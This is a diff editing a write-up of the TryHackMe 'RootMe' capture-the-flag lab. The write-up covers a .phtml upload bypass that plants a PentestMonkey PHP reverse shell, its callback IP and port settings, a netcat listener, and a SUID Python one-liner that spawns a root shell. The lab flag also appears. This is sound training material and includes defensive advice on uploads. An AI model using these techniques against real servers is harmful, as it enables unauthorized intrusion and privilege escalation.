@@ -87,8 +87,6 @@ I first tried uploading the PentestMonkey PHP reverse shell with a `.php` extens
 
 The important lesson was that blocking only the `.php` extension does not necessarily prevent PHP execution. Whether an alternative extension is executed depends on the server's Apache/PHP configuration, so this behavior should be verified on the target rather than assumed.
 
-> **Screenshot note:** `root-me-7.png` records an `.htaccess` upload attempt, and `root-me-8.png` shows a request named `exploit.cybersec`. These screenshots do not document the successful `.phtml` upload you described. They are retained as records of an earlier experiment, not presented as the successful attack path. The successful method documented here is the `.phtml` extension.
-
 ## 7. Prepare and upload the reverse shell
 
 I used the PentestMonkey PHP reverse shell and uploaded it with the `.phtml` extension so the upload filter would accept it. The supplied [`shell.phtml`](shell.phtml) file is included with this write-up.
@@ -96,11 +94,9 @@ I used the PentestMonkey PHP reverse shell and uploaded it with the `.phtml` ext
 Before uploading, the reverse shell's callback IP and port must match the attacking machine and listener. In the supplied shell file, these values were:
 
 ```php
-$ip = '192.168.131.1';
+$ip = 'YOUR_IP';
 $port = 4444;
 ```
-
-Use your own reachable TryHackMe VPN/interface IP rather than copying this IP blindly. The address shown here was the one in the supplied lab file and may not work in another session.
 
 After the upload, I accessed the uploaded `.phtml` file through the web server to trigger the reverse connection.
 
@@ -187,41 +183,8 @@ THM{privil3g3_3sc414t10n}
 
 ![SUID Python root shell and root flag](screenshots/root-me-12.png)
 
-## 12. Quick command reference
 
-Commands recorded in my screenshots, gathered in one place:
-
-```bash
-# Add the target hostname
-sudo nano /etc/hosts
-
-# Scan the target and save the output
-nmap -sC -sV root-me.thm -o nmap_scan.txt
-
-# Enumerate web directories and common extensions
-gobuster dir -u http://root-me.thm/ -w big.txt -x php,json,js,txt,html,php.php,bak --no-error
-
-# Start the reverse-shell listener
-nc -lvnp 4444
-
-# Locate and read the user flag
-find / -type f -name user.txt 2>/dev/null
-cat /var/www/user.txt
-
-# Find SUID files
-find / -perm -u=s -type f 2>/dev/null
-
-# Use the SUID Python interpreter to spawn a shell that preserves effective UID
-/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-
-# Verify root and read the root flag
-whoami
-cd /root && ls
-cat root.txt
-```
-
-
-## 13. Tools used
+## 12. Tools used
 
 - **Nmap** — service and version enumeration.
 - **Gobuster** — web directory and extension enumeration.
@@ -229,15 +192,13 @@ cat root.txt
 - **Netcat** — receiving the reverse shell.
 - **Linux `find`, `cat`, and `whoami`** — locating flags, finding SUID files, and verifying privileges.
 - **PentestMonkey PHP reverse shell** — initial shell payload.
-- **GTFOBins / online research** — understanding the SUID Python escalation path.
+- **GTFOBins** — understanding the SUID Python escalation path.
 
-## 14. Key takeaways
+## 13. Key takeaways
 
 - A plain homepage does not mean the web application has no useful endpoints. Directory enumeration can reveal functionality that is not linked from the home page.
 - A file-upload feature combined with a publicly accessible upload directory deserves careful testing.
-- Blocking only `.php` is not a robust upload defense. Safer designs use a strict allowlist, validate file content, store uploads outside the web root, and disable script execution in upload directories.
 - Blocking only `.php` is insufficient if other PHP-handled extensions such as `.phtml` are allowed by the server configuration. Use a strict upload allowlist, validate content, store uploads outside the web root, and disable script execution in upload directories.
 - Always enumerate SUID binaries after obtaining a low-privilege shell. Interpreters such as Python should not ordinarily be SUID-root.
-- Verify each stage: confirm the reverse shell's user, identify the unusual SUID binary, and verify the resulting privileges before reading the final flag.
 
 **RootMe completed**
